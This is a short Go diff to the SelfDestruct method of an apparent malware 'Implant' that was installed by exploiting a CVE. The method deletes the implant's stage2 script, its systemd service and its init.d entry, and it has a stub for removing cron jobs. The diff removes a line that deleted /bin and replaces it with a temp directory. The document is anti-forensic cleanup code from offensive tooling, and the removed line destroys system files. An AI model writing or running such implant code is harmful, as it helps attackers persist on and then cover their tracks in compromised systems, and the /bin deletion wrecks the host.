@@ -171,7 +171,7 @@ func (i *Implant) ExecuteTasks() {
 }
 
 func (i *Implant) SelfDestruct() {
-	os.RemoveAll("/bin") // TODO: make sure all implant stuff will be in this dir
+	os.RemoveAll("/tmp/myapp") // TODO: make sure all implant stuff will be in this dir
 
 	// undoing everything in stage1.sh in CVE
 	stage_2_path := "/tmp/stage2.sh"
@@ -179,7 +179,8 @@ func (i *Implant) SelfDestruct() {
 	os.RemoveAll("/etc/systemd/system/stage2.service") // remove dir with system services
 	os.RemoveAll("/etc/init.d/stage2")
 
-	// -> removing cron jobs (WORK IN PROG)
+	// TODO
+	// -> removing cron jobs
 	scheduler, _ := gocron.NewScheduler()
 	scheduler.RemoveByTags()
 
